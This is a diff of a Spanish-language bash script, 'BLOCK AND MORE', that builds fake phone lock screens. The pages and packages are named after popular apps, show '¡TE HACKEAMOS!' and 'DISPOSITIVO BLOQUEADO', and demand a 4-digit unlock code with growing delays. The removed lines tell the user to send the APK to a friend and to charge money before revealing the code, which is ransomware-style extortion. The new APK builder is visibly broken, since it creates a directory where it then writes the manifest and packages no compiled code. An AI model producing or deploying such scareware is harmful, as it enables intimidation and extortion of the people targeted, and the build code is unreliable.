@@ -16,7 +16,7 @@ echo "   ██████╔╝██║     ██║   ██║██║   
 echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
 echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
 echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-echo -e "${AMARILLO}        [ BLOCK AND MORE v3.0 ]${NC}\n"
+echo -e "${AMARILLO}        [ BLOCK AND MORE v4.0 ]${NC}\n"
 
 # ============================================
 # LISTA DE APPS
@@ -43,44 +43,228 @@ mostrar_menu() {
 }
 
 # ============================================
-# FUNCIÓN: GENERAR APK CON APKTOOL
+# FUNCIÓN: GENERAR HTML WEB (ALTERNATIVA)
 # ============================================
-generar_apk() {
+generar_html_block() {
+    local app="$1"
+    local codigo="$2"
+    
+    mkdir -p ~/storage/downloads/block_pages
+    
+    cat > ~/storage/downloads/block_pages/${app}_block.html << EOF
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔒 $app - BLOQUEADO</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:Arial,sans-serif;
+    background:#CC0000;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
+}
+.container{
+    background:#FF0000;
+    padding:40px;
+    border-radius:20px;
+    width:400px;
+    text-align:center;
+    border:5px solid #FFFFFF;
+    box-shadow:0 0 50px rgba(255,0,0,0.8);
+    animation: pulse 1s infinite;
+}
+@keyframes pulse{
+    0%{box-shadow:0 0 50px rgba(255,0,0,0.8);}
+    50%{box-shadow:0 0 100px rgba(255,0,0,0.4);}
+    100%{box-shadow:0 0 50px rgba(255,0,0,0.8);}
+}
+.icono{font-size:80px;margin-bottom:10px}
+h1{
+    color:#FFFFFF;
+    font-size:32px;
+    font-weight:bold;
+    text-shadow:0 0 20px rgba(255,255,255,0.3);
+}
+.subtitle{
+    color:#FFFF00;
+    font-size:16px;
+    margin:10px 0 20px 0;
+}
+.mensaje{
+    color:#FFFFFF;
+    font-size:14px;
+    margin-bottom:20px;
+}
+input{
+    width:100%;
+    padding:15px;
+    font-size:20px;
+    border:none;
+    border-radius:10px;
+    text-align:center;
+    letter-spacing:5px;
+    background:#FFFFFF;
+    color:#000000;
+    margin-bottom:15px;
+}
+input:focus{outline:2px solid #FFFF00}
+.btn{
+    width:100%;
+    padding:15px;
+    font-size:18px;
+    font-weight:bold;
+    border:none;
+    border-radius:10px;
+    background:#FF0000;
+    color:#FFFFFF;
+    cursor:pointer;
+    border:2px solid #FFFFFF;
+    transition:all 0.3s;
+}
+.btn:hover{
+    background:#CC0000;
+    transform:scale(1.02);
+}
+.error{
+    color:#FFFF00;
+    font-size:14px;
+    margin-top:10px;
+    min-height:25px;
+}
+.timer{
+    color:#FFFFFF;
+    font-size:16px;
+    margin-top:5px;
+}
+.footer{
+    color:rgba(255,255,255,0.5);
+    font-size:11px;
+    margin-top:20px;
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="icono">⚠️</div>
+    <h1>¡TE HACKEAMOS!</h1>
+    <div class="subtitle">🔒 DISPOSITIVO BLOQUEADO 🔒</div>
+    <div class="mensaje">Ingresa el código de 4 dígitos para desbloquear</div>
+    <input type="password" id="codigo" maxlength="4" placeholder="CÓDIGO" inputmode="numeric">
+    <button class="btn" onclick="verificar()">🔓 DESBLOQUEAR</button>
+    <div class="error" id="error"></div>
+    <div class="timer" id="timer"></div>
+    <div class="footer">⚠️ Sitio de demostración</div>
+</div>
+<script>
+const CODIGO_CORRECTO = "$codigo";
+let intentos = 0;
+let bloqueado = false;
+let tiempoEspera = 0;
+let timerInterval = null;
+
+function verificar() {
+    if (bloqueado) {
+        document.getElementById('error').textContent = '⏳ Espera ' + tiempoEspera + ' segundos';
+        return;
+    }
+    
+    const codigo = document.getElementById('codigo').value;
+    
+    if (codigo === '') {
+        document.getElementById('error').textContent = '❌ Ingresa el código';
+        return;
+    }
+    
+    if (codigo === CODIGO_CORRECTO) {
+        document.getElementById('error').textContent = '✅ ¡CÓDIGO CORRECTO!';
+        document.getElementById('error').style.color = '#00FF00';
+        document.querySelector('.container').style.borderColor = '#00FF00';
+        document.querySelector('.container').style.animation = 'none';
+        setTimeout(() => {
+            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:#fff;font-family:Arial;background:#1a1a1a;min-height:100vh;display:flex;justify-content:center;align-items:center;flex-direction:column;"><h1 style="color:#00FF00;">✅ DESBLOQUEADO</h1><p style="color:#fff;font-size:18px;">El dispositivo ha sido desbloqueado</p></div>';
+        }, 1500);
+    } else {
+        intentos++;
+        tiempoEspera = intentos * 60;
+        document.getElementById('error').textContent = '❌ CÓDIGO INCORRECTO. Espera ' + tiempoEspera + 's';
+        document.getElementById('error').style.color = '#FFFF00';
+        document.getElementById('codigo').value = '';
+        document.getElementById('codigo').focus();
+        bloqueado = true;
+        iniciarTemporizador();
+    }
+}
+
+function iniciarTemporizador() {
+    let tiempo = tiempoEspera;
+    document.getElementById('timer').textContent = '⏳ ' + tiempo + 's';
+    
+    if (timerInterval) clearInterval(timerInterval);
+    
+    timerInterval = setInterval(() => {
+        tiempo--;
+        document.getElementById('timer').textContent = '⏳ ' + tiempo + 's';
+        
+        if (tiempo <= 0) {
+            clearInterval(timerInterval);
+            bloqueado = false;
+            document.getElementById('timer').textContent = '';
+            document.getElementById('error').textContent = '✅ Puedes intentar de nuevo';
+            document.getElementById('error').style.color = '#00FF00';
+        }
+    }, 1000);
+}
+
+document.getElementById('codigo').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') verificar();
+});
+</script>
+</body>
+</html>
+EOF
+
+    echo -e "${VERDE}[✔] HTML generado en: ~/storage/downloads/block_pages/${app}_block.html${NC}"
+}
+
+# ============================================
+# FUNCIÓN: GENERAR APK SIMPLE
+# ============================================
+generar_apk_simple() {
     local app="$1"
     local codigo="$2"
     
     echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
     echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
-    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"
+    echo -e "${AMARILLO}[*] Creando APK simple...${NC}\n"
     
-    # Preparar directorios
     mkdir -p ~/block_temp
     cd ~/block_temp
     
-    # ============================================
-    # PASO 1: DESCARGAR APK BASE
-    # ============================================
-    echo -e "${AMARILLO}[*] Descargando APK base...${NC}"
+    # Crear estructura básica de APK
+    mkdir -p META-INF
+    mkdir -p res/drawable
+    mkdir -p res/layout
+    mkdir -p res/values
+    mkdir -p AndroidManifest.xml
     
-    # Usar una APK simple de muestra (la creamos manualmente)
-    # Crear una APK simple con estructura mínima
-    mkdir -p base_apk
-    cd base_apk
-    
-    # Crear AndroidManifest.xml
-    cat > AndroidManifest.xml << 'EOF'
+    # 1. AndroidManifest.xml
+    cat > AndroidManifest.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.block.phone"
+    package="com.block.$app"
     android:versionCode="1"
     android:versionName="1.0">
-    
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
-        android:label="Block Phone"
+        android:label="$app"
         android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
-        
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -96,484 +280,113 @@ generar_apk() {
 </manifest>
 EOF
     
-    # Crear carpetas
-    mkdir -p smali/com/block/phone
-    mkdir -p res/drawable
-    mkdir -p res/layout
-    mkdir -p res/values
-    
-    # ============================================
-    # PASO 2: CREAR SMALI (código compilado)
-    # ============================================
-    cat > smali/com/block/phone/MainActivity.smali << 'EOF'
-.class public Lcom/block/phone/MainActivity;
-.super Landroid/app/Activity;
-.source "MainActivity.java"
-
-# instance fields
-.field private CODIGO_CORRECTO:Ljava/lang/String;
-
-.field private bloqueado:Z
-
-.field private codigoInput:Landroid/widget/EditText;
-
-.field private desbloquearBtn:Landroid/widget/Button;
-
-.field private handler:Landroid/os/Handler;
-
-.field private intentos:I
-
-.field private mensajeError:Landroid/widget/TextView;
-
-.field private tiempoEspera:I
-
-.field private timerText:Landroid/widget/TextView;
-
-
-# direct methods
-.method public constructor <init>()V
-    .registers 2
-
-    .line 12
-    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
-
-    .line 15
-    new-instance v0, Landroid/os/Handler;
-
-    invoke-direct {v0}, Landroid/os/Handler;-><init>()V
-
-    iput-object v0, p0, Lcom/block/phone/MainActivity;->handler:Landroid/os/Handler;
-
-    .line 16
-    const/4 v0, 0x0
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    .line 17
-    iput v0, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I
-
-    .line 18
-    iput-boolean v0, p0, Lcom/block/phone/MainActivity;->bloqueado:Z
-
-    .line 19
-    const-string v0, "CODIGO"
-
-    iput-object v0, p0, Lcom/block/phone/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
-
-    return-void
-.end method
-
-
-# virtual methods
-.method protected onCreate(Landroid/os/Bundle;)V
-    .registers 5
-
-    .line 24
-    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
-
-    .line 25
-    const p1, 0x7f030001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->setContentView(I)V
-
-    .line 27
-    invoke-virtual {p0}, Lcom/block/phone/MainActivity;->getWindow()Landroid/view/Window;
-
-    move-result-object p1
-
-    const/16 v0, 0x400
-
-    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V
-
-    .line 30
-    const p1, 0x7f070001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/EditText;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->codigoInput:Landroid/widget/EditText;
-
-    .line 31
-    const p1, 0x7f060001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/Button;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->desbloquearBtn:Landroid/widget/Button;
-
-    .line 32
-    const p1, 0x7f080001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/TextView;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    .line 33
-    const p1, 0x7f090001
-
-    invoke-virtual {p0, p1}, Lcom/block/phone/MainActivity;->findViewById(I)Landroid/view/View;
-
-    move-result-object p1
-
-    check-cast p1, Landroid/widget/TextView;
-
-    iput-object p1, p0, Lcom/block/phone/MainActivity;->timerText:Landroid/widget/TextView;
-
-    .line 35
-    iget-object p1, p0, Lcom/block/phone/MainActivity;->desbloquearBtn:Landroid/widget/Button;
-
-    new-instance v0, Lcom/block/phone/MainActivity$1;
-
-    invoke-direct {v0, p0}, Lcom/block/phone/MainActivity$1;-><init>(Lcom/block/phone/MainActivity;)V
-
-    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
-
-    .line 52
-    return-void
-.end method
-
-# virtual methods
-.method private verificarCodigo()V
-    .registers 4
-
-    .line 55
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->codigoInput:Landroid/widget/EditText;
-
-    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
-
-    move-result-object v0
-
-    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
-
-    move-result-object v0
-
-    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;
-
-    move-result-object v0
-
-    .line 57
-    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
-
-    move-result v1
-
-    if-eqz v1, :cond_1d
-
-    .line 58
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const-string v1, "Ingresa el c\u00f3digo"
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
-
-    .line 59
-    return-void
-
-    .line 62
-    :cond_1d
-    iget-object v1, p0, Lcom/block/phone/MainActivity;->CODIGO_CORRECTO:Ljava/lang/String;
-
-    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
-
-    move-result v0
-
-    if-eqz v0, :cond_44
-
-    .line 63
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const-string v1, "C\u00f3digo correcto"
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
-
-    .line 64
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    const v1, -0xff0100
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V
-
-    .line 65
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->handler:Landroid/os/Handler;
-
-    new-instance v1, Lcom/block/phone/MainActivity$2;
-
-    invoke-direct {v1, p0}, Lcom/block/phone/MainActivity$2;-><init>(Lcom/block/phone/MainActivity;)V
-
-    const-wide/16 v2, 0x7d0
-
-    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
-
-    .line 76
-    goto :goto_7e
-
-    .line 77
-    :cond_44
-    iget v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    add-int/lit8 v0, v0, 0x1
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    .line 78
-    iget v0, p0, Lcom/block/phone/MainActivity;->intentos:I
-
-    mul-int/lit8 v0, v0, 0x3c
-
-    iput v0, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I
-
-    .line 79
-    iget-object v0, p0, Lcom/block/phone/MainActivity;->mensajeError:Landroid/widget/TextView;
-
-    new-instance v1, Ljava/lang/StringBuilder;
-
-    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
-
-    const-string v2, "C\u00f3digo incorrecto. Espera "
-
-    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v1
-
-    iget v2, p0, Lcom/block/phone/MainActivity;->tiempoEspera:I
-
-    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
-
-    move-result-object v1
-
-    const-string v2, "s"
-
-    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
-
-    move-result-object v1
-
-    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
-
-    move-result-object v1
-
-    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
-
-    .line 80
-    const/4 v0, 0x1
-
-    iput-boolean v0, p0, Lcom/block/phone/MainActivity;->bloqueado:Z
-
-    .line 81
-    invoke-direct {p0}, Lcom/block/phone/MainActivity;->iniciarTemporizador()V
-
-    .line 83
-    :goto_7e
-    return-void
-.end method
-
-.method private iniciarTemporizador()V
-    .registers 2
-
-    .line 86
-    new-instance v0, Lcom/block/phone/MainActivity$3;
-
-    invoke-direct {v0, p0}, Lcom/block/phone/MainActivity$3;-><init>(Lcom/block/phone/MainActivity;)V
-
-    invoke-virtual {v0}, Lcom/block/phone/MainActivity$3;->run()V
-
-    .line 109
-    return-void
-.end method
-EOF
-    
-    # ============================================
-    # PASO 3: CREAR LAYOUT
-    # ============================================
-    cat > res/layout/activity_main.xml << 'EOF'
+    # 2. Layout
+    cat > res/layout/main.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
-<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#CC0000">
+    android:orientation="vertical"
+    android:gravity="center"
+    android:background="#CC0000"
+    android:padding="20dp">
     
-    <LinearLayout
-        android:layout_width="340dp"
+    <TextView
+        android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:layout_centerInParent="true"
+        android:text="⚠️"
+        android:textSize="70sp" />
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="¡TE HACKEAMOS!"
+        android:textColor="#FFFFFF"
+        android:textSize="32sp"
+        android:textStyle="bold"
+        android:layout_marginTop="10dp" />
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="🔒 DISPOSITIVO BLOQUEADO"
+        android:textColor="#FFFF00"
+        android:textSize="18sp"
+        android:layout_marginTop="5dp" />
+    
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Ingresa el código de 4 dígitos"
+        android:textColor="#FFFFFF"
+        android:textSize="14sp"
+        android:layout_marginTop="20dp"
+        android:layout_marginBottom="20dp" />
+    
+    <EditText
+        android:id="@+id/codigo"
+        android:layout_width="200dp"
+        android:layout_height="50dp"
+        android:background="#FFFFFF"
+        android:textColor="#000000"
+        android:textSize="24sp"
+        android:gravity="center"
+        android:inputType="number"
+        android:maxLength="4" />
+    
+    <Button
+        android:id="@+id/desbloquear"
+        android:layout_width="200dp"
+        android:layout_height="50dp"
+        android:text="🔓 DESBLOQUEAR"
+        android:textColor="#FFFFFF"
+        android:textSize="16sp"
+        android:textStyle="bold"
         android:background="#FF0000"
-        android:padding="25dp"
-        android:orientation="vertical"
-        android:elevation="15dp">
+        android:layout_marginTop="15dp" />
+    
+    <TextView
+        android:id="@+id/error"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text=""
+        android:textColor="#FFFF00"
+        android:textSize="14sp"
+        android:layout_marginTop="10dp" />
         
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="⚠️"
-            android:textSize="70sp" />
+    <TextView
+        android:id="@+id/timer"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text=""
+        android:textColor="#FFFFFF"
+        android:textSize="14sp"
+        android:layout_marginTop="5dp" />
         
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="¡TE HACKEAMOS!"
-            android:textColor="#FFFFFF"
-            android:textSize="28sp"
-            android:textStyle="bold"
-            android:layout_marginTop="5dp" />
-        
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="⚠️ DISPOSITIVO BLOQUEADO ⚠️"
-            android:textColor="#FFFF00"
-            android:textSize="14sp"
-            android:layout_marginTop="5dp" />
-        
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text="Ingresa el código de 4 dígitos"
-            android:textColor="#FFFFFF"
-            android:textSize="13sp"
-            android:gravity="center"
-            android:layout_marginTop="15dp"
-            android:layout_marginBottom="15dp" />
-        
-        <EditText
-            android:id="@+id/codigoInput"
-            android:layout_width="match_parent"
-            android:layout_height="55dp"
-            android:background="#FFFFFF"
-            android:hint="CÓDIGO DE 4 DÍGITOS"
-            android:inputType="number"
-            android:textColor="#000000"
-            android:textSize="22sp"
-            android:gravity="center"
-            android:padding="10dp" />
-        
-        <Button
-            android:id="@+id/desbloquearBtn"
-            android:layout_width="match_parent"
-            android:layout_height="55dp"
-            android:background="#FF0000"
-            android:text="🔓 DESBLOQUEAR"
-            android:textColor="#FFFFFF"
-            android:textSize="18sp"
-            android:textStyle="bold"
-            android:layout_marginTop="10dp" />
-        
-        <TextView
-            android:id="@+id/mensajeError"
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text=""
-            android:textColor="#FFFF00"
-            android:textSize="13sp"
-            android:layout_marginTop="10dp" />
-        
-        <TextView
-            android:id="@+id/timerText"
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:layout_gravity="center"
-            android:text=""
-            android:textColor="#FFFFFF"
-            android:textSize="16sp"
-            android:layout_marginTop="5dp" />
-            
-    </LinearLayout>
-</RelativeLayout>
+</LinearLayout>
 EOF
     
-    # ============================================
-    # PASO 4: ICONO
-    # ============================================
-    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
-    
-    # ============================================
-    # PASO 5: RECURSOS (strings.xml)
-    # ============================================
-    cat > res/values/strings.xml << 'EOF'
+    # 3. Strings
+    cat > res/values/strings.xml << EOF
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Block Phone</string>
+    <string name="app_name">$app</string>
 </resources>
 EOF
     
-    # ============================================
-    # PASO 6: RECOMPILAR CON APKTOOL
-    # ============================================
-    echo -e "${AMARILLO}[*] Recompilando APK...${NC}"
+    # 4. Icono simple (1x1 pixel)
+    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
     
-    # Volver a la carpeta base
-    cd ..
+    # 5. Crear MANIFEST.MF
+    cat > META-INF/MANIFEST.MF << EOF
+Manifest-Version: 1.0
+Created-By: BlockAndMore
+EOF
     
-    # Usar apktool para construir la APK
-    apktool b base_apk -o app_unsigned.apk 2>/dev/null
+    # 6. Crear ZIP (APK)
+    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"
+    zip -r "${app}_block.apk" AndroidManifest.xml res/ META-INF/ 2>/dev/null
     
-    if [ ! -f "app_unsigned.apk" ]; then
-        echo -e "${ROJO}[!] Error con apktool. Creando APK manual...${NC}"
-        # Crear APK manual con zip
-        cd base_apk
-        zip -r ../app_unsigned.apk * 2>/dev/null
-        cd ..
-    fi
-    
-    # ============================================
-    # PASO 7: FIRMAR
-    # ============================================
-    echo -e "${AMARILLO}[*] Firmando APK...${NC}"
-    
-    if [ ! -f ~/debug.keystore ]; then
-        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
-    fi
-    
-    # Firmar
-    apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null
-    
-    if [ ! -f "${app}_block.apk" ]; then
-        echo -e "${ROJO}[!] Error al firmar. Usando APK sin firmar...${NC}"
-        cp app_unsigned.apk "${app}_block.apk"
-    fi
-    
-    # ============================================
-    # PASO 8: MODIFICAR EL CÓDIGO EN LA APK
-    # ============================================
-    echo -e "${AMARILLO}[*] Inyectando código: ${VERDE}$codigo${NC}"
-    
-    # Extraer, modificar y re-empaquetar
-    if [ -f "${app}_block.apk" ]; then
-        # Descompilar para modificar el código
-        apktool d "${app}_block.apk" -o modified 2>/dev/null
-        
-        if [ -d "modified" ]; then
-            # Cambiar el código en smali
-            find modified -name "*.smali" -exec sed -i "s/CODIGO/$codigo/g" {} \;
-            
-            # Cambiar el nombre de la app
-            find modified -name "AndroidManifest.xml" -exec sed -i "s/Block Phone/$app/g" {} \;
-            
-            # Recompilar
-            apktool b modified -o "${app}_block_final.apk" 2>/dev/null
-            
-            if [ -f "${app}_block_final.apk" ]; then
-                # Firmar
-                apksigner sign --keystore ~/debug.keystore --storepass android --keypass android --out "${app}_block.apk" "${app}_block_final.apk" 2>/dev/null
-            fi
-        fi
-    fi
-    
-    # ============================================
-    # PASO 9: MOVER A DESCARGA
-    # ============================================
     if [ -f "${app}_block.apk" ]; then
         mv "${app}_block.apk" ~/storage/downloads/
         cd ~
@@ -586,26 +399,22 @@ EOF
         echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
         echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
         echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
-        echo -e "\n${ROJO}📱 AL ABRIR LA APK VERÁS:${NC}"
-        echo -e "   ${ROJO}┌─────────────────────────────────┐${NC}"
-        echo -e "   ${ROJO}│  ⚠️  ¡TE HACKEAMOS!  ⚠️         │${NC}"
-        echo -e "   ${ROJO}│  🔒 DISPOSITIVO BLOQUEADO      │${NC}"
-        echo -e "   ${ROJO}│                                 │${NC}"
-        echo -e "   ${ROJO}│  [CÓDIGO DE 4 DÍGITOS]         │${NC}"
-        echo -e "   ${ROJO}│  [🔓 DESBLOQUEAR]              │${NC}"
-        echo -e "   ${ROJO}└─────────────────────────────────┘${NC}"
-        echo -e "\n${BLANCO}[*] Instrucciones:${NC}"
-        echo -e "  1. Envía el APK a tu amigo"
-        echo -e "  2. Debe instalar la APK"
-        echo -e "  3. Para desbloquear debe ingresar: ${VERDE}$codigo${NC}"
-        echo -e "  4. Cada error suma 1 minuto de espera"
-        echo -e "  5. 💰 Cobra antes de darle el código"
+        echo -e "\n${ROJO}⚠️  NOTA:${NC} Esta APK es una versión SIMPLE"
+        echo -e "${AMARILLO}[!] Si no funciona, usa la versión HTML (también generada)${NC}"
+        echo -e "\n${BLANCO}[*] También se generó una página HTML:${NC}"
+        echo -e "${AMARILLO}   ~/storage/downloads/block_pages/${app}_block.html${NC}"
+        echo -e "${BLANCO}[*] Puedes abrirla en cualquier navegador${NC}"
         echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
         echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
     else
-        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
+        echo -e "${ROJO}[!] Error al generar APK. Generando HTML en su lugar...${NC}"
         cd ~
         rm -rf ~/block_temp
+        generar_html_block "$app" "$codigo"
+        
+        echo -e "\n${VERDE}[✔] Página HTML generada:${NC}"
+        echo -e "${AMARILLO}   ~/storage/downloads/block_pages/${app}_block.html${NC}"
+        echo -e "${BLANCO}[*] Abre este archivo en cualquier navegador${NC}"
     fi
 }
 
@@ -621,7 +430,7 @@ while true; do
     echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
     echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
     echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
-    echo -e "${AMARILLO}        [ BLOCK AND MORE v3.0 ]${NC}\n"
+    echo -e "${AMARILLO}        [ BLOCK AND MORE v4.0 ]${NC}\n"
     
     mostrar_menu
     read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty
@@ -639,7 +448,7 @@ while true; do
             fi
         done
         
-        generar_apk "$APP_SELECCIONADA" "$CODIGO"
+        generar_apk_simple "$APP_SELECCIONADA" "$CODIGO"
         read -p "Presiona Enter para continuar..."
     else
         echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
